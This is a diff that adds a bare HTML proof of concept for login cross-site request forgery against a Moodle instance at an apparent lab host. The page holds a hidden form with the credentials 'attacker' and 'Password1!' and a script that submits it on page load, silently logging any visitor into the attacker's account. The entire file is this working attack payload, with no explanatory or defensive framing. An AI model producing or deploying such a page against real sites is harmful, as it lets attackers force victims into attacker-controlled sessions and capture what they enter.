@@ -1,0 +1,12 @@
+<html>
+    <body>
+        <form action="http://moodle.lab.local/login/index.php" method="POST" id="loginform">
+            <input type="hidden" name="anchor" value="" />
+            <input type="hidden" name="username" value="attacker" />
+            <input type="hidden" name="password" value="Password1&#33;" />
+        </form>
+        <script>
+            document.getElementById("loginform").submit();
+        </script>
+    </body>
+</html>
